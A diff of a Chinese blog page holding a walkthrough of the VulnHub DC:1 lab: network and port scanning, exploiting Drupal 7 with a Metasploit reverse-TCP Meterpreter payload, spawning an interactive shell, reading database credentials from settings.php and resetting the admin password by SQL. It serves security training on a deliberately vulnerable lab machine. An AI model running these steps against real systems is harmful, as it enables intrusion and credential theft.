@@ -148,24 +148,23 @@ highgerms's blog = 又是美好的一天呀！</title>
 
     <h1 id="vulnhub靶机渗透之dc1-dc系列"><a class="anchor" href="#vulnhub靶机渗透之dc1-dc系列">#</a> VulnHub 靶机渗透之 DC:1 【DC 系列】</h1>
 <h3 id="发现主机-靶机ip192168124130"><a class="anchor" href="#发现主机-靶机ip192168124130">#</a> 发现主机  ---&gt; 靶机 ip：192.168.124.130</h3>
-<p><img data-src="image/VulnHub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8BDC-1-%E3%80%90DC%E7%B3%BB%E5%88%97%E3%80%91/1678598122636.png" alt="1678598122636"></p>
 <pre><code>nmap -sP 192.168.124.0/24
 # nmap ping扫描 -sP
 </code></pre>
-<p><img data-src="VulnHub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8BDC-1-%E3%80%90DC%E7%B3%BB%E5%88%97%E3%80%91.assets/1646224528915.png" alt="1646224528915"></p>
+<p><img data-src="/blog_pic/VulnHub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8BDC-1-%E3%80%90DC%E7%B3%BB%E5%88%97%E3%80%91.assets/1646224528915.png" alt="1646224528915"></p>
 <pre><code>netdiscover -r 192.168.124.0/24 
 </code></pre>
-<p><img data-src="VulnHub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8BDC-1-%E3%80%90DC%E7%B3%BB%E5%88%97%E3%80%91.assets/1646224347329.png" alt="1646224347329"></p>
+<p><img data-src="/blog_pic/VulnHub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8BDC-1-%E3%80%90DC%E7%B3%BB%E5%88%97%E3%80%91.assets/1646224347329.png" alt="1646224347329"></p>
 <pre><code>arp-scan -l
 </code></pre>
-<p><img data-src="VulnHub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8BDC-1-%E3%80%90DC%E7%B3%BB%E5%88%97%E3%80%91.assets/1646224093605.png" alt="1646224093605"></p>
+<p><img data-src="/blog_pic/VulnHub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8BDC-1-%E3%80%90DC%E7%B3%BB%E5%88%97%E3%80%91.assets/1646224093605.png" alt="1646224093605"></p>
 <h3 id="扫描靶机开放端口-22-80-111-54150"><a class="anchor" href="#扫描靶机开放端口-22-80-111-54150">#</a> 扫描靶机开放端口 -》22、80、111、54150</h3>
 <pre><code>nmap -p1-65535 192.168.124.130  
 # nmap指定端口扫描，查看是否开放 -p
 </code></pre>
-<p><img data-src="VulnHub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8BDC-1-%E3%80%90DC%E7%B3%BB%E5%88%97%E3%80%91.assets/1646224787388.png" alt="1646224787388"></p>
+<p><img data-src="/blog_pic/VulnHub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8BDC-1-%E3%80%90DC%E7%B3%BB%E5%88%97%E3%80%91.assets/1646224787388.png" alt="1646224787388"></p>
 <h3 id="扫描靶机操作系统-linux-3x"><a class="anchor" href="#扫描靶机操作系统-linux-3x">#</a> 扫描靶机操作系统 -》Linux 3.X</h3>
-<p><img data-src="VulnHub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8BDC-1-%E3%80%90DC%E7%B3%BB%E5%88%97%E3%80%91.assets/1646224959511.png" alt="1646224959511"></p>
+<p><img data-src="/blog_pic/VulnHub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8BDC-1-%E3%80%90DC%E7%B3%BB%E5%88%97%E3%80%91.assets/1646224959511.png" alt="1646224959511"></p>
 <h3 id="nmap进行完整全面的扫描"><a class="anchor" href="#nmap进行完整全面的扫描">#</a> nmap 进行完整全面的扫描</h3>
 <p>Nmap 进行完整全面的扫描</p>
 <pre><code>nmap –T4 –A –v   192.168.124.130
@@ -174,34 +173,34 @@ highgerms's blog = 又是美好的一天呀！</title>
 -T4：指定扫描过程使用的时序，总有6个级别（0-5），级别越高，扫描速度越快，但也容易被防火墙或IDS检测并屏蔽掉，在网络通讯状况良好的情况推荐使用T4；
 -v表示显示冗余（verbosity）信息，在扫描过程中显示扫描的细节。
 </code></pre>
-<p>但是 冗余细节太多了，我们还是去掉 -v<img data-src="VulnHub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8BDC-1-%E3%80%90DC%E7%B3%BB%E5%88%97%E3%80%91.assets/1646225545043.png" alt="1646225545043"></p>
+<p>但是 冗余细节太多了，我们还是去掉 -v<img data-src="/blog_pic/VulnHub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8BDC-1-%E3%80%90DC%E7%B3%BB%E5%88%97%E3%80%91.assets/1646225545043.png" alt="1646225545043"></p>
 <pre><code>nmap –T4 –A   192.168.124.130
 </code></pre>
-<p><img data-src="VulnHub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8BDC-1-%E3%80%90DC%E7%B3%BB%E5%88%97%E3%80%91.assets/1646226466845.png" alt="1646226466845"></p>
+<p><img data-src="/blog_pic/VulnHub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8BDC-1-%E3%80%90DC%E7%B3%BB%E5%88%97%E3%80%91.assets/1646226466845.png" alt="1646226466845"></p>
 <p>80 端口是 drupal 7 服务</p>
 <p>111 端口是 rpcbind 服务</p>
 <p>网站还有 robots.txt，不能爬取的有那 36 个目录，可以看看</p>
 <p>大部分都是 403forbidden 和 access denied</p>
-<p><img data-src="VulnHub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8BDC-1-%E3%80%90DC%E7%B3%BB%E5%88%97%E3%80%91.assets/1646226706196.png" alt="1646226706196"></p>
-<p><img data-src="VulnHub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8BDC-1-%E3%80%90DC%E7%B3%BB%E5%88%97%E3%80%91.assets/1646226907705.png" alt="1646226907705"></p>
+<p><img data-src="/blog_pic/VulnHub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8BDC-1-%E3%80%90DC%E7%B3%BB%E5%88%97%E3%80%91.assets/1646226706196.png" alt="1646226706196"></p>
+<p><img data-src="/blog_pic/VulnHub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8BDC-1-%E3%80%90DC%E7%B3%BB%E5%88%97%E3%80%91.assets/1646226907705.png" alt="1646226907705"></p>
 <p>创个用户，下图反映出肯定有 admin 管理员用户存在。</p>
-<p><img data-src="VulnHub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8BDC-1-%E3%80%90DC%E7%B3%BB%E5%88%97%E3%80%91.assets/1646226965872.png" alt="1646226965872"></p>
+<p><img data-src="/blog_pic/VulnHub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8BDC-1-%E3%80%90DC%E7%B3%BB%E5%88%97%E3%80%91.assets/1646226965872.png" alt="1646226965872"></p>
 <h3 id="对网站进行指纹识别发现是个drupal-7的cms"><a class="anchor" href="#对网站进行指纹识别发现是个drupal-7的cms">#</a> 对网站进行指纹识别：发现是个 Drupal 7 的 cms</h3>
 <p>通过插件 wappalyzer 可以简单识别，也可以通过 WhatWeb 工具扫描查看详细指纹信息。</p>
-<p><img data-src="VulnHub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8BDC-1-%E3%80%90DC%E7%B3%BB%E5%88%97%E3%80%91.assets/1646225759189.png" alt="1646225759189"></p>
+<p><img data-src="/blog_pic/VulnHub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8BDC-1-%E3%80%90DC%E7%B3%BB%E5%88%97%E3%80%91.assets/1646225759189.png" alt="1646225759189"></p>
 <p>Whatweb 是一个基于 Ruby 语言的开源网站指纹识别软件，whatweb 能够识别各种关于网站的详细信息包括：CMS 类型、博客平台、中间件、web 框架模块、网站服务器、脚本类型、JavaScript 库、IP、cookie 等等。</p>
 <pre><code>whatweb -v  192.168.124.130 
 -v 详细显示扫描的结果
 </code></pre>
-<p><img data-src="VulnHub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8BDC-1-%E3%80%90DC%E7%B3%BB%E5%88%97%E3%80%91.assets/1646226244572.png" alt="1646226244572"></p>
+<p><img data-src="/blog_pic/VulnHub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8BDC-1-%E3%80%90DC%E7%B3%BB%E5%88%97%E3%80%91.assets/1646226244572.png" alt="1646226244572"></p>
 <h3 id="对网站进行目录扫描"><a class="anchor" href="#对网站进行目录扫描">#</a> 对网站进行目录扫描</h3>
 <p>dirb 是基于字典的 Web 目录扫描工具。该工具根据用户提供的字典，对目标网站目录进行暴力猜测。它会尝试以递归方式进行爆破，以发现更多的路径。</p>
 <pre><code>dirb http://192.168.124.130  
 </code></pre>
 <p>发现了一些目录，但是没啥用</p>
-<p><img data-src="VulnHub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8BDC-1-%E3%80%90DC%E7%B3%BB%E5%88%97%E3%80%91.assets/1646227430664.png" alt="1646227430664"></p>
+<p><img data-src="/blog_pic/VulnHub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8BDC-1-%E3%80%90DC%E7%B3%BB%E5%88%97%E3%80%91.assets/1646227430664.png" alt="1646227430664"></p>
 <p><span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMTI0LjEzMC94bWxycGMucGhw">http://192.168.124.130/xmlrpc.php</span></p>
-<p><img data-src="VulnHub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8BDC-1-%E3%80%90DC%E7%B3%BB%E5%88%97%E3%80%91.assets/1646227359957.png" alt="1646227359957"></p>
+<p><img data-src="/blog_pic/VulnHub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8BDC-1-%E3%80%90DC%E7%B3%BB%E5%88%97%E3%80%91.assets/1646227359957.png" alt="1646227359957"></p>
 <h3 id="msf使用drupal框架漏洞突破"><a class="anchor" href="#msf使用drupal框架漏洞突破">#</a> MSF 使用 Drupal 框架漏洞突破</h3>
 <pre><code>#打开msf
 msfconsole
@@ -215,13 +214,13 @@ info 1
 #查看5模块：exploit/unix/webapp/drupal_restws_unserialize 的描述信息，看看是否可以使用
 info 5
 </code></pre>
-<p><img data-src="VulnHub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8BDC-1-%E3%80%90DC%E7%B3%BB%E5%88%97%E3%80%91.assets/1646227562528.png" alt="1646227562528"></p>
-<p><img data-src="VulnHub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8BDC-1-%E3%80%90DC%E7%B3%BB%E5%88%97%E3%80%91.assets/1646365980084.png" alt="1646365980084"></p>
-<p><img data-src="VulnHub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8BDC-1-%E3%80%90DC%E7%B3%BB%E5%88%97%E3%80%91.assets/1646366045144.png" alt="1646366045144"></p>
-<p><img data-src="VulnHub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8BDC-1-%E3%80%90DC%E7%B3%BB%E5%88%97%E3%80%91.assets/1646366282652.png" alt="1646366282652"></p>
-<p><img data-src="VulnHub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8BDC-1-%E3%80%90DC%E7%B3%BB%E5%88%97%E3%80%91.assets/1646366294240.png" alt="1646366294240"></p>
+<p><img data-src="/blog_pic/VulnHub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8BDC-1-%E3%80%90DC%E7%B3%BB%E5%88%97%E3%80%91.assets/1646227562528.png" alt="1646227562528"></p>
+<p><img data-src="/blog_pic/VulnHub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8BDC-1-%E3%80%90DC%E7%B3%BB%E5%88%97%E3%80%91.assets/1646365980084.png" alt="1646365980084"></p>
+<p><img data-src="/blog_pic/VulnHub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8BDC-1-%E3%80%90DC%E7%B3%BB%E5%88%97%E3%80%91.assets/1646366045144.png" alt="1646366045144"></p>
+<p><img data-src="/blog_pic/VulnHub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8BDC-1-%E3%80%90DC%E7%B3%BB%E5%88%97%E3%80%91.assets/1646366282652.png" alt="1646366282652"></p>
+<p><img data-src="/blog_pic/VulnHub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8BDC-1-%E3%80%90DC%E7%B3%BB%E5%88%97%E3%80%91.assets/1646366294240.png" alt="1646366294240"></p>
 <p>看描述版本都符合，但是 exploit/unix/webapp/drupal_restws_unserialize 试了一下，不得行</p>
-<p><img data-src="VulnHub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8BDC-1-%E3%80%90DC%E7%B3%BB%E5%88%97%E3%80%91.assets/1646366461097.png" alt="1646366461097"></p>
+<p><img data-src="/blog_pic/VulnHub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8BDC-1-%E3%80%90DC%E7%B3%BB%E5%88%97%E3%80%91.assets/1646366461097.png" alt="1646366461097"></p>
 <pre><code># 使用1序号这个模块
 msf&gt;use 1  
 
@@ -231,11 +230,11 @@ msf&gt;set payload php/meterpreter/reverse_tcp
 【反向连接一般用被攻击者处于内网，攻击者在外网的情况。对于实际的渗透测试过程来说，我们常常使用的往往是反弹shell的方式来突破边界防火墙的限制。】
 【我们不能确定应该选择反向 （reverse）Shell 还是正向 （bind）Shell 的时候就使用反向shell，因为采用reverse的方法一般较为安全，因为是在被攻击机连接攻击机，所以一般不会被防火墙发现；而bind在测试机打开端口时很容易被安全软件和防火墙发现】
 </code></pre>
-<p><img data-src="VulnHub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8BDC-1-%E3%80%90DC%E7%B3%BB%E5%88%97%E3%80%91.assets/1646227826898.png" alt="1646227826898"></p>
+<p><img data-src="/blog_pic/VulnHub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8BDC-1-%E3%80%90DC%E7%B3%BB%E5%88%97%E3%80%91.assets/1646227826898.png" alt="1646227826898"></p>
 <pre><code>msf&gt;show options
 # 会列出我们选择的这个模块所需的各种参数。
 </code></pre>
-<p><img data-src="VulnHub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8BDC-1-%E3%80%90DC%E7%B3%BB%E5%88%97%E3%80%91.assets/1646227967809.png" alt="1646227967809"></p>
+<p><img data-src="/blog_pic/VulnHub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8BDC-1-%E3%80%90DC%E7%B3%BB%E5%88%97%E3%80%91.assets/1646227967809.png" alt="1646227967809"></p>
 <p>LHOSTS 是反弹回来的地址，即我们这台攻击者 kali 的 ip 地址，反弹窗口默认都是 4444</p>
 <pre><code>#设置受害者ip：RHOSTS
 set RHOSTS 192.168.124.130
@@ -243,21 +242,21 @@ set RHOSTS 192.168.124.130
 # 发动攻击
 msf&gt;exploit 
 </code></pre>
-<p><img data-src="VulnHub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8BDC-1-%E3%80%90DC%E7%B3%BB%E5%88%97%E3%80%91.assets/1646228178866.png" alt="1646228178866"></p>
+<p><img data-src="/blog_pic/VulnHub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8BDC-1-%E3%80%90DC%E7%B3%BB%E5%88%97%E3%80%91.assets/1646228178866.png" alt="1646228178866"></p>
 <p>进入 Meterpreter 会话【后渗透阶段】，这说明攻击生效了</p>
-<p><img data-src="VulnHub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8BDC-1-%E3%80%90DC%E7%B3%BB%E5%88%97%E3%80%91.assets/1646228571153.png" alt="1646228571153"></p>
+<p><img data-src="/blog_pic/VulnHub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8BDC-1-%E3%80%90DC%E7%B3%BB%E5%88%97%E3%80%91.assets/1646228571153.png" alt="1646228571153"></p>
 <p>这时我们输入 shell 进入 cmd</p>
-<p><img data-src="VulnHub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8BDC-1-%E3%80%90DC%E7%B3%BB%E5%88%97%E3%80%91.assets/1646228621131.png" alt="1646228621131"></p>
+<p><img data-src="/blog_pic/VulnHub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8BDC-1-%E3%80%90DC%E7%B3%BB%E5%88%97%E3%80%91.assets/1646228621131.png" alt="1646228621131"></p>
 <p>whoami-&gt;www-data  不是 root 用户</p>
 <p>ls-&gt; 发现有个 flag1.txt</p>
 <p>cat flag1.txt 查看 flag 内容：暗示我们要在配置文件中寻找 setting、config 啥的都可以看看</p>
-<p><img data-src="VulnHub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8BDC-1-%E3%80%90DC%E7%B3%BB%E5%88%97%E3%80%91.assets/1646228701959.png" alt="1646228701959"></p>
+<p><img data-src="/blog_pic/VulnHub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8BDC-1-%E3%80%90DC%E7%B3%BB%E5%88%97%E3%80%91.assets/1646228701959.png" alt="1646228701959"></p>
 <p>exit 退出 shell 之后，help 查看 meterpreter 帮助命令</p>
-<p><img data-src="VulnHub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8BDC-1-%E3%80%90DC%E7%B3%BB%E5%88%97%E3%80%91.assets/1646230019941.png" alt="1646230019941"></p>
+<p><img data-src="/blog_pic/VulnHub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8BDC-1-%E3%80%90DC%E7%B3%BB%E5%88%97%E3%80%91.assets/1646230019941.png" alt="1646230019941"></p>
 <p>获取一个完全交互式 shell 输入：</p>
 <pre><code>python -c  'import pty;pty.spawn (&quot;/bin/bash&quot;)'
 </code></pre>
-<p><img data-src="VulnHub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8BDC-1-%E3%80%90DC%E7%B3%BB%E5%88%97%E3%80%91.assets/1646232171679.png" alt="1646232171679"></p>
+<p><img data-src="/blog_pic/VulnHub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8BDC-1-%E3%80%90DC%E7%B3%BB%E5%88%97%E3%80%91.assets/1646232171679.png" alt="1646232171679"></p>
 <p>刚才 flag1.txt 里面的暗示实在配置文件找</p>
 <pre><code>find . -name *setting*
 find . -name *setting*
@@ -266,13 +265,13 @@ find .是在当前路径下面找
 <p>各种查找，出现的都看了一下，最后发现了 flag 存在于默认文件 ./sites/default/settings.php 中</p>
 <pre><code>cat  ./sites/default/settings.php |grep flag
 </code></pre>
-<p><img data-src="VulnHub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8BDC-1-%E3%80%90DC%E7%B3%BB%E5%88%97%E3%80%91.assets/1646231611484.png" alt="1646231611484"></p>
-<p><img data-src="VulnHub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8BDC-1-%E3%80%90DC%E7%B3%BB%E5%88%97%E3%80%91.assets/1646231842940.png" alt="1646231842940"></p>
-<p><img data-src="VulnHub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8BDC-1-%E3%80%90DC%E7%B3%BB%E5%88%97%E3%80%91.assets/1646231779389.png" alt="1646231779389"></p>
+<p><img data-src="/blog_pic/VulnHub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8BDC-1-%E3%80%90DC%E7%B3%BB%E5%88%97%E3%80%91.assets/1646231611484.png" alt="1646231611484"></p>
+<p><img data-src="/blog_pic/VulnHub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8BDC-1-%E3%80%90DC%E7%B3%BB%E5%88%97%E3%80%91.assets/1646231842940.png" alt="1646231842940"></p>
+<p><img data-src="/blog_pic/VulnHub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8BDC-1-%E3%80%90DC%E7%B3%BB%E5%88%97%E3%80%91.assets/1646231779389.png" alt="1646231779389"></p>
 <p>仔细看看里面的 flag 提示</p>
 <pre><code>cat ./sites/default/settings.php
 </code></pre>
-<p><img data-src="VulnHub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8BDC-1-%E3%80%90DC%E7%B3%BB%E5%88%97%E3%80%91.assets/1646232262859.png" alt="1646232262859"></p>
+<p><img data-src="/blog_pic/VulnHub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8BDC-1-%E3%80%90DC%E7%B3%BB%E5%88%97%E3%80%91.assets/1646232262859.png" alt="1646232262859"></p>
 <p>我们还拿到了 mysql 数据库的账号密码</p>
 <p>'database' =&gt; 'drupaldb',<br>
 'username' =&gt; 'dbuser',<br>
@@ -280,35 +279,35 @@ find .是在当前路径下面找
 <pre><code>mysql -u dbuser -pR0ck3t
 </code></pre>
 <p>使用获得的账号密码登录数据库</p>
-<p><img data-src="VulnHub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8BDC-1-%E3%80%90DC%E7%B3%BB%E5%88%97%E3%80%91.assets/1646232509043.png" alt="1646232509043"></p>
+<p><img data-src="/blog_pic/VulnHub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8BDC-1-%E3%80%90DC%E7%B3%BB%E5%88%97%E3%80%91.assets/1646232509043.png" alt="1646232509043"></p>
 <pre><code>show databases;          #查看数据库
 
 use  drupaldb;              #选择数据库
 
 show tables;                #查看当前数据库下的表名  
 </code></pre>
-<p><img data-src="VulnHub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8BDC-1-%E3%80%90DC%E7%B3%BB%E5%88%97%E3%80%91.assets/1646232591220.png" alt="1646232591220"></p>
+<p><img data-src="/blog_pic/VulnHub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8BDC-1-%E3%80%90DC%E7%B3%BB%E5%88%97%E3%80%91.assets/1646232591220.png" alt="1646232591220"></p>
 <p>可以看到 users 表</p>
-<p><img data-src="VulnHub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8BDC-1-%E3%80%90DC%E7%B3%BB%E5%88%97%E3%80%91.assets/1646232628076.png" alt="1646232628076"></p>
+<p><img data-src="/blog_pic/VulnHub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8BDC-1-%E3%80%90DC%E7%B3%BB%E5%88%97%E3%80%91.assets/1646232628076.png" alt="1646232628076"></p>
 <pre><code>select * from users; 
 </code></pre>
 <p>看到了 admin 用户和加过密的密码</p>
-<p><img data-src="VulnHub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8BDC-1-%E3%80%90DC%E7%B3%BB%E5%88%97%E3%80%91.assets/1646232720738.png" alt="1646232720738"></p>
+<p><img data-src="/blog_pic/VulnHub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8BDC-1-%E3%80%90DC%E7%B3%BB%E5%88%97%E3%80%91.assets/1646232720738.png" alt="1646232720738"></p>
 <p>我们虽然不能查看密码，但是我们可以更改 admin 密码【密码重置】</p>
 <p>在网上搜到 \scripts\password-hash.sh 这个是加密密码的脚本文件。</p>
-<p><img data-src="VulnHub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8BDC-1-%E3%80%90DC%E7%B3%BB%E5%88%97%E3%80%91.assets/1646232881497.png" alt="1646232881497"></p>
+<p><img data-src="/blog_pic/VulnHub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8BDC-1-%E3%80%90DC%E7%B3%BB%E5%88%97%E3%80%91.assets/1646232881497.png" alt="1646232881497"></p>
 <p>exit 退出 mysql</p>
 <p>输入 php scripts/password-hash.sh 123456</p>
 <p>这个时候我们获取了 123456 加密后的密码</p>
-<p><img data-src="VulnHub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8BDC-1-%E3%80%90DC%E7%B3%BB%E5%88%97%E3%80%91.assets/1646233078803.png" alt="1646233078803"></p>
+<p><img data-src="/blog_pic/VulnHub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8BDC-1-%E3%80%90DC%E7%B3%BB%E5%88%97%E3%80%91.assets/1646233078803.png" alt="1646233078803"></p>
 <p>进入数据库执行更新语句，进行 admin 用户的密码重新设置。</p>
 <pre><code>update users set pass='$S$DuAzjjytMdHT3mmydQXhExGwi6pvHcLImfbhuguLIgY5rFIjauMQ'where uid=1;
 </code></pre>
-<p><img data-src="VulnHub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8BDC-1-%E3%80%90DC%E7%B3%BB%E5%88%97%E3%80%91.assets/1646233200985.png" alt="1646233200985"></p>
-<p><img data-src="VulnHub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8BDC-1-%E3%80%90DC%E7%B3%BB%E5%88%97%E3%80%91.assets/1646233262370.png" alt="1646233262370"></p>
-<p><img data-src="VulnHub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8BDC-1-%E3%80%90DC%E7%B3%BB%E5%88%97%E3%80%91.assets/1646233274405.png" alt="1646233274405"></p>
+<p><img data-src="/blog_pic/VulnHub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8BDC-1-%E3%80%90DC%E7%B3%BB%E5%88%97%E3%80%91.assets/1646233200985.png" alt="1646233200985"></p>
+<p><img data-src="/blog_pic/VulnHub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8BDC-1-%E3%80%90DC%E7%B3%BB%E5%88%97%E3%80%91.assets/1646233262370.png" alt="1646233262370"></p>
+<p><img data-src="/blog_pic/VulnHub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8BDC-1-%E3%80%90DC%E7%B3%BB%E5%88%97%E3%80%91.assets/1646233274405.png" alt="1646233274405"></p>
 <p>看到已经修改成功。</p>
-<p><img data-src="VulnHub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8BDC-1-%E3%80%90DC%E7%B3%BB%E5%88%97%E3%80%91.assets/1646233338997.png" alt="1646233338997"></p>
+<p><img data-src="/blog_pic/VulnHub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8BDC-1-%E3%80%90DC%E7%B3%BB%E5%88%97%E3%80%91.assets/1646233338997.png" alt="1646233338997"></p>
 <p>1：我们可以利用 hashcat 对加密后的密码进行破解，但是比较费时间。</p>
 <p>2：可以更改 admin 密码【密码重置】   ，本文中采用这个方法。</p>
 <p>3：在 exploitdb 中有一个 Drupal7 的攻击脚本，可以增加一个 admin 权限的账号。【 这篇文章有写 <span class="exturl" data-url="aHR0cHM6Ly9jbG91ZC50ZW5jZW50LmNvbS9kZXZlbG9wZXIvYXJ0aWNsZS8xNDcyMTkyP2Zyb209YXJ0aWNsZS5kZXRhaWwuMTQ3MjcyMiVFMyU4MCU5MQ==">https://cloud.tencent.com/developer/article/1472192?from=article.detail.1472722】</span></p>
@@ -374,7 +373,7 @@ show tables;                #查看当前数据库下的表名
       <i class="ic i-calendar-check"></i>
     </span>
     <span class="text">Edited on</span>
-    <time title="Modified: 2023-03-12 13:15:43" itemprop="dateModified" datetime="2023-03-12T13:15:43+08:00">2023-03-12</time>
+    <time title="Modified: 2023-03-12 13:55:06" itemprop="dateModified" datetime="2023-03-12T13:55:06+08:00">2023-03-12</time>
   </span>
 </div>
 
@@ -429,10 +428,10 @@ show tables;                #查看当前数据库下的表名
     <div class="item left">
       
 
-  <a href="/2023/03/12/%E5%88%9D%E5%BF%83/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;tva3.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1giph4wqtg4j20zk0m8x6p.jpg" title="初心">
+  <a href="/2023/03/12/%E5%88%9D%E5%BF%83/" itemprop="url" rel="prev" data-background-image="&#x2F;2023&#x2F;03&#x2F;12&#x2F;%E5%88%9D%E5%BF%83&#x2F;image&#x2F;1.jpg" title="自我意识">
   <span class="type">Previous Post</span>
-  <span class="category"><i class="ic i-flag"></i> </span>
-  <h3>初心</h3>
+  <span class="category"><i class="ic i-flag"></i> 自我</span>
+  <h3>自我意识</h3>
   </a>
 
     </div>
@@ -471,13 +470,13 @@ show tables;                #查看当前数据库下的表名
 <nav class="state">
     <div class="item posts">
       <a href="/archives/">
-        <span class="count">3</span>
+        <span class="count">2</span>
         <span class="name">posts</span>
       </a>
     </div>
     <div class="item categories">
       <a href="/categories/">
-        <span class="count">1</span>
+        <span class="count">2</span>
         <span class="name">categories</span>
       </a>
     </div>
